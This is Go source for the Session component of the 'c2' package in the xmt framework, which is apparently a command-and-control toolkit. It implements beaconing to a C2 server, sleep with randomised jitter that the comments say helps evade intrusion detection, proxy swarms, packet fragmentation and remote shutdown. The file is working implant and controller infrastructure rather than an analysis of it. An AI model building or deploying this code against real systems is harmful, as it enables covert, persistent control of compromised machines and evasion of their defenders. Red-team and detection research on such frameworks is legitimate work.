package c2

import (
	"context"
	"errors"
	"fmt"
	"net"
	"sync/atomic"
	"time"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util"
)

const (
	maxErrors = 3

	shutdownAck   uint8 = 0x0
	shutdownTell  uint8 = 0x1
	shutdownClose uint8 = 0x2
)

// ErrFullBuffer is returned from the WritePacket function when the send buffer for
// Session is full.
var ErrFullBuffer = errors.New("cannot add a Packet to a full send buffer")

// Session is a struct that represents a connection between the client and the Listener.
// This struct does some automatic handeling and acts as the communication channel between
// the client and server.
type Session struct {
	ID       device.ID
	Last     time.Time
	Device   device.Machine
	Created  time.Time
	Receive  func(*Session, *com.Packet)
	Shutdown func(*Session)

	chm     uint32
	host    string
	peek    *com.Packet
	send    chan *com.Packet
	recv    chan *com.Packet
	wake    chan waker
	done    uint32
	frags   map[uint16]*cluster
	swarm   *proxySwarm
	sleep   time.Duration
	jitter  uint8
	errors  uint8
	parent  *Listener
	socket  func(string) (net.Conn, error)
	channel uint32
	connection
}
type cluster struct {
	max  uint16
	data []*com.Packet
}

func (s *Session) wait() {
	if s.sleep == 0 {
		return
	}
	w := s.sleep
	if s.jitter > 0 && s.jitter <= 100 {
		if (s.jitter == 100 || uint8(util.Rand.Int31n(100)) < s.jitter) && w > time.Millisecond {
			d := util.Rand.Int63n(int64(w / time.Millisecond))
			if util.Rand.Int31n(2) == 1 {
				d = d * -1
			}
			w += (time.Duration(d) * time.Millisecond)
			if w < 0 {
				w = time.Duration(w * -1)
			}
		}
	}
	x, c := context.WithTimeout(s.ctx, w)
	select {
	case <-s.wake:
		break
	case <-x.Done():
		break
	case <-s.ctx.Done():
		break
	}
	c()
}

// Wait will block until the current Session is closed and shutdown.
func (s *Session) Wait() {
	<-s.ctx.Done()
}

// Stop indicates that the client should gracefully shutdown and release resources. This will not
// close the session until the client acknowledges and sends the response to this packet.
func (s *Session) Stop() {
	s.shutdown(shutdownTell)
}

// Wake will interrupt the sleep of the current Session thread. This will trigger the send and receive
// functions of this Session.
func (s *Session) Wake() {
	if s.wake == nil {
		return
	}
	if len(s.wake) < cap(s.wake) {
		s.wake <- wake
	}
}
func (s *Session) listen() {
	for ; atomic.LoadUint32(&s.done) == 0; s.wait() {
		s.log.Trace("[%s] Waking up...", s.ID)
		if s.swarm != nil {
			s.swarm.process()
		}
		c, err := s.socket(s.host)
		if err != nil {
			s.log.Warning("[%s] Received an error attempting to connect to %q: %s!", s.ID, s.host, err.Error())
			if s.errors < maxErrors {
				s.errors++
				continue
			}
			break
		}
		s.log.Trace("[%s] Connected to %q...", s.ID, s.host)
		for o := false; atomic.LoadUint32(&s.done) == 0; {
			if s.session(c, o) {
				o = true
				continue
			}
			break
		}
		c.Close()
		if s.errors > maxErrors {
			break
		}
	}
	if s.Shutdown != nil {
		s.s.events <- event{s: s, sFunc: s.Shutdown}
	}
	s.log.Trace("[%s] Stopping transaction thread...", s.ID)
	s.cancel()
	if s.swarm != nil {
		s.swarm.Close()
	}
	if s.parent != nil && atomic.LoadUint32(&s.parent.done) == 0 {
		s.parent.close <- s.Device.ID.Hash()
	}
	close(s.send)
	close(s.recv)
	if s.wake != nil {
		close(s.wake)
	}
}

// Jitter returns the Jitter percentage value. Values of zero (0) indicate that Jitter is disabled.
func (s Session) Jitter() uint8 {
	return s.jitter
}

// IsProxy returns true when a Proxy has been attached to this Session and is active.
func (s Session) IsProxy() bool {
	return s.swarm != nil
}

// Close stops the listening thread from this Session and releases all associated resources.
func (s *Session) Close() error {
	atomic.StoreUint32(&s.done, 1)
	s.cancel()
	s.Wake()
	return nil
}

// String returns the details of this Session as a string.
func (s Session) String() string {
	switch {
	case s.parent == nil && (s.jitter == 0 || s.jitter > 100):
		return fmt.Sprintf("[%s] %s -> %s", s.ID.String(), s.sleep.String(), s.host)
	case s.parent == nil:
		return fmt.Sprintf("[%s] %s/%d%%-> %s", s.ID.String(), s.sleep.String(), s.jitter, s.host)
	case s.parent != nil && (s.jitter == 0 || s.jitter > 100):
		return fmt.Sprintf("[%s] %s -> %s %s", s.ID.String(), s.sleep.String(), s.host, s.Last.Format(time.RFC1123))
	default:
		return fmt.Sprintf(
			"[%s] %s/%d%%-> %s %s", s.ID.String(), s.sleep.String(), s.jitter, s.host, s.Last.Format(time.RFC1123),
		)
	}
}

// IsActive returns true if this Session is still able to send and receive Packets.
func (s Session) IsActive() bool {
	return s.done == 0
}

// IsClient returns true when this Session is not associated to a Listener on this end, which signifies that this
// session is Client initiated.
func (s Session) IsClient() bool {
	return s.parent == nil
}

// IsChannel will return true is this Session sets the Channel flag on any Packets that flow this this
// Session, including Proxied clients.
func (s Session) IsChannel() bool {
	return s.channel == 1
}

// SetJitter sets Jitter percentage of the Session's wake interval. This is a 0 to 100 percentage (inclusive) that
// will determine any +/- time is added to the waiting period. This assists in evading IDS/NDS devices/systems. A
// value of 0 will disable Jitter and any value over 100 will set the value to 100, which represents using Jitter 100%
// of the time. If this is a Server-side Session, the new value will be sent to the Client in a MsgProfile Packet.
func (s *Session) SetJitter(j int) {
	s.SetDuration(s.sleep, j)
}
func (c *cluster) done() *com.Packet {
	if uint16(len(c.data)) >= c.max {
		n := c.data[0]
		for x := 1; x < len(c.data); x++ {
			n.Add(c.data[x])
			c.data[x].Clear()
			c.data[x] = nil
		}
		c.data = nil
		n.Flags.Clear()
		return n
	}
	return nil
}

// Read attempts to grab a Packet from the receiving buffer. This function will wait for a Packet
// while the buffer is empty.
func (s *Session) Read() *com.Packet {
	return <-s.recv
}

// SetChannel will disable setting the Channel mode of this Session. If true, every Packet sent will trigger Channel
// mode. This setting does NOT affect the Session enabling Channel mode if a Packet is sent with the Channel Flag
// enabled. Channel is NOT supported by non-statefull connections (UDP/Web/ICMP, etc).
func (s *Session) SetChannel(c bool) {
	if c {
		atomic.StoreUint32(&s.channel, 1)
	} else {
		atomic.StoreUint32(&s.channel, 0)
	}
}

// RemoteAddr returns a string representation of the remotely connected IP address. This could be the IP address of the
// c2 server or the public IP of the client.
func (s Session) RemoteAddr() string {
	return s.host
}

// Time returns the value for the timeout period between C2 Server connections.
func (s Session) Time() time.Duration {
	return s.sleep
}

// Write adds the supplied Packet into the stack to be sent to the server on next wake. This call is
// asynchronous and returns immediately. Unlike 'WritePacket' this function does NOT return an error and will wait
// for the buffer to have open spots.
func (s *Session) Write(p *com.Packet) {
	s.write(true, p)
}
func (s *Session) shutdown(w uint8) error {
	switch w {
	case shutdownAck:
		s.WritePacket(&com.Packet{ID: MsgShutdown, Device: s.Device.ID, Job: 1})
		if s.parent == nil {
			return s.Close()
		}
	case shutdownClose:
		return s.Close()
	case shutdownTell:
		return s.WritePacket(&com.Packet{ID: MsgShutdown, Device: s.Device.ID})
	}
	return nil
}
func (c *cluster) add(p *com.Packet) error {
	if p == nil || p.Empty() {
		return nil
	}
	if len(c.data) > 0 && !c.data[0].Belongs(p) {
		return com.ErrMismatchedID
	}
	if p.Flags.Len() > c.max {
		c.max = p.Flags.Group()
	}
	c.data = append(c.data, p)
	return nil
}

// ReadPacket attempts to grab a Packet from the receiving buffer. This function returns nil if the buffer is empty.
func (s *Session) ReadPacket() *com.Packet {
	if len(s.recv) > 0 {
		return <-s.recv
	}
	return nil
}

// SetSleep sets the wake interval period for this Session. This is the time value between connections to the C2
// Server. This does NOT apply to channels. If this is a Server-side Session, the new value will be sent to the
// Client in a MsgProfile Packet. This setting does not affect Jitter.
func (s *Session) SetSleep(t time.Duration) {
	s.SetDuration(t, int(s.jitter))
}

// Context returns the current Session's context. This function can be useful for canceling running processes
// when this Session closes.
func (s *Session) Context() context.Context {
	return s.ctx
}
func (s *Session) next() (*com.Packet, error) {
	if s.peek == nil && len(s.send) == 0 {
		if s.parent == nil {
			if atomic.LoadUint32(&s.chm) == 1 {
				s.wait()
			}
			return &com.Packet{ID: MsgPing, Device: s.ID}, nil
		}
		return &com.Packet{ID: MsgSleep, Device: s.ID}, nil
	}
	var p *com.Packet
	if s.peek != nil {
		p, s.peek = s.peek, nil
	} else {
		p = <-s.send
	}
	if len(s.send) == 0 && p.Verify(s.ID) {
		return p, nil
	}
	var (
		v    = &com.Packet{ID: MsgMultiple, Device: s.ID, Flags: com.FlagMulti}
		t    int
		m, a bool
	)
	if p != nil {
		m, t = true, 1
		if p.Flags&com.FlagChannel != 0 {
			v.Flags |= com.FlagChannel
		}
		if err := p.MarshalStream(v); err != nil {
			return nil, err
		}
		p.Clear()
		p = nil
	}
	for len(s.send) > 0 && t < limits.SmallLimit() && v.Size() < limits.FragLimit() {
		p = <-s.send
		if p.Size()+v.Size() > limits.FragLimit() {
			s.peek = p
			break
		}
		if p.Verify(s.ID) {
			a = true
		} else {
			m = true
		}
		if p.Flags&com.FlagChannel != 0 {
			v.Flags |= com.FlagChannel
		}
		if err := p.MarshalStream(v); err != nil {
			return nil, err
		}
		t++
		p.Clear()
		p = nil
	}
	if !a {
		m, t = true, t+1
		p = &com.Packet{ID: MsgPing, Device: s.ID}
		if err := p.MarshalStream(v); err != nil {
			return nil, err
		}
	}
	v.Close()
	if m {
		v.Flags |= com.FlagMultiDevice
	}
	v.Flags.SetLen(uint16(t))
	return v, nil
}

// WritePacket adds the supplied Packet into the stack to be sent to the server on next wake. This call is
// asynchronous and returns immediately. The only error may be returned is 'ErrFullBuffer' if the send buffer is full.
func (s *Session) WritePacket(p *com.Packet) error {
	return s.write(false, p)
}
func (s *Session) session(c net.Conn, o bool) bool {
	p, err := s.next()
	if err != nil {
		s.log.Warning("[%s] Received an error retriving the next Packet to %q: %s!", s.ID, s.host, err.Error())
		return false
	}
	var y = o
	//fmt.Printf("ch %d, s %t, chm %d\n", s.channel, o, s.chm)
	switch {
	case atomic.LoadUint32(&s.channel) == 0 && o:
		fallthrough
	case atomic.LoadUint32(&s.channel) == 1 && !o:
		if !o {
			atomic.StoreUint32(&s.chm, 1)
		} else {
			atomic.StoreUint32(&s.chm, 0)
		}
		y = !o
		p.Flags |= com.FlagChannel
		s.log.Trace("[%s] Setting Channel flag on next Packet to %q!", s.ID, s.host)
	case p.Flags&com.FlagChannel != 0 && o:
		fallthrough
	case p.Flags&com.FlagChannel != 0 && !o:
		if !o {
			atomic.StoreUint32(&s.chm, 1)
		} else {
			atomic.StoreUint32(&s.chm, 0)
		}
		y = !o
		s.log.Trace("[%s] Setting Channel flag on next Packet to %q (set by Packet)!", s.ID, s.host)
	}
	s.log.Trace("[%s] Sending Packet %q to %q.", s.ID, p.String(), s.host)
	if err := writePacket(c, s.w, s.t, p); err != nil {
		s.log.Warning("[%s] Received an error attempting to write to %q: %s!", s.ID, s.host, err.Error())
		return false
	}
	p.Clear()
	if p, err = readPacket(c, s.w, s.t); err != nil {
		s.log.Warning("[%s] Received an error attempting to read from %q: %s!", s.ID, s.host, err.Error())
		s.errors++
		return false
	}
	s.log.Trace("[%s] %s: Received a Packet %q...", s.ID, s.host, p.String())
	if err := notify(s.parent, s, p); err != nil {
		s.log.Warning("[%s] Received an error processing packet data from %q! (%s)", s.ID, s.host, err.Error())
		return false
	}
	s.errors = 0
	return y
}
func (s *Session) write(w bool, p *com.Packet) error {
	if p.Len() <= limits.FragLimit() {
		if !w && len(s.send)+1 >= cap(s.send) {
			return ErrFullBuffer
		}
		s.send <- p
		if atomic.LoadUint32(&s.chm) == 1 {
			s.Wake()
		}
		return nil
	}
	var m = (p.Len() / limits.FragLimit()) + 1
	if !w && len(s.send)+m >= cap(s.send) {
		return ErrFullBuffer
	}
	var (
		x    = int64(p.Len())
		g    = uint16(util.Rand.Uint32())
		f    = atomic.LoadUint32(&s.chm) == 1
		err  error
		t, n int64
	)
	for i := 0; i < m && t < x; i++ {
		c := &com.Packet{ID: p.ID, Job: p.Job, Flags: p.Flags, Chunk: data.Chunk{Limit: limits.FragLimit()}}
		c.Flags.SetGroup(g)
		c.Flags.SetLen(uint16(m))
		c.Flags.SetPosition(uint16(i))
		if n, err = p.WriteTo(c); err != nil && err != data.ErrLimit {
			c.Flags.SetLen(0)
			c.Flags.SetPosition(0)
			c.Flags.Set(com.FlagError)
			return err
		}
		t += n
		s.send <- c
		if f {
			s.Wake()
		}
	}
	return nil
}

// SetDuration sets the wake interval period and Jitter for this Session. This is the time value between
// connections to the C2 Server. This does NOT apply to channels. Jitter is a 0 to 100 percentage (inclusive) that
// will determine any +/- time is added to the waiting period. This assists in evading IDS/NDS devices/systems. A
// value of 0 will disable Jitter and any value over 100 will set the value to 100, which represents using Jitter 100%
// of the time. If this is a Server-side Session, the new value will be sent to the Client in a MsgProfile Packet.
func (s *Session) SetDuration(t time.Duration, j int) {
	switch {
	case j < 0:
		s.jitter = 0
	case j > 100:
		s.jitter = 100
	default:
		s.jitter = uint8(j)
	}
	s.sleep = t
	if s.parent != nil {
		n := &com.Packet{ID: MsgProfile, Device: s.Device.ID}
		n.WriteUint8(s.jitter)
		n.WriteUint64(uint64(s.sleep))
		n.Close()
		s.send <- n
	}
}
